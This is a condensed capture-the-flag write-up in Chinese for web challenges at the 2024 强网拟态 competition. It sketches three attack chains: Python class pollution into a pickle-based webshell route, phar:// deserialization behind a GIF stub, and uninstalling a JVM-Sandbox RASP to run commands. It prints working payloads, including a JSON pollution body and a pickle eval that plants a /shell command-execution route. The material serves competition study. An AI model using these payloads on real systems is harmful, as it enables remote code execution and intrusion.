---
title: "2024 强网拟态 Nepnep WP"
category: web
tags: ["强网拟态", "web", "Python原型链污染", "pickle reduce RCE", "JWT secret_key 污染", "phar:// 反序列化"]
signals: ["强网拟态 2024", "Python原型链污染", "pickle reduce RCE", "JWT secret_key 污染", "phar:// 反序列化", "gzip 绕 PILER", "JVM-SANDBOX uninstall RASP", "内存马 app.add_route", "文件读取 capoo.phar", "deserialize", "rce", "phar", "jwt", "pickle"]
difficulty: hard
source: "https://www.ctfiot.com/211007.html"
tools: ["Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2024 强网拟态 Nepnep WP

> 赛事：强网拟态 2024 | 方向：web | 难度：hard | 工具：Python

## 一句话总结

原型链污染 + pickle 内存马 + phar:// 反序列化 + JVM-SANDBOX uninstall。

## 攻击链

1. ez_picker: /register JSON __init__.__globals__ 污染 safe_modules/safe_names/secret_key → pickle reduce eval() 写内存马 add_route(''/shell'') → 上传 1.pkl 触发 → /shell?cmd=cat /tr3e_fl4g_1s_h3re_lol ; capoo: file_get_contents 读 showpic.php 源码 → phar:// + gzip 压缩 GIF89a stub 绕 PILER 检测 → phar:// 反序列化 __wakeup + diff 读 flag ; OnlineRunner: java 不 import 类直接 java.io.FileReader 列目录 → 读 app.jar → 反编译 agent.jar → 调用 com.alibaba.jvm.sandbox.agent.AgentLauncher uninstall RASP → Runtime.exec 通杀

## 关键 payload

```
{"username": 1, "password": 1, "__init__": {"__globals__": {"safe_modules": ["os", "builtins"], "safe_names": ["eval", "popen"], "secret_key": 111}}} ; pickle (eval, (''app.add_route(lambda request: __import__("os").popen(request.args.get("cmd")).read(), "/shell", methods=["GET", "POST"])'',)) ; $phar->setStub("GIF89a"); gzcompress 改 .gif
```

## 经验教训

Python 原型链污染必须显式允许 safe_modules=['os','builtins'] 才有效；JVM-SANDBOX 启动时调用 uninstall() 可彻底关掉 RASP。

## 标签

Python原型链污染、pickle reduce RCE、JWT secret_key 污染、phar:// 反序列化、gzip 绕 PILER、JVM-SANDBOX uninstall RASP、内存马 app.add_route、文件读取 capoo.phar

## 参考来源

- https://www.ctfiot.com/211007.html
- 原文件：2024_强网拟态_Nepnep_WP.full.md
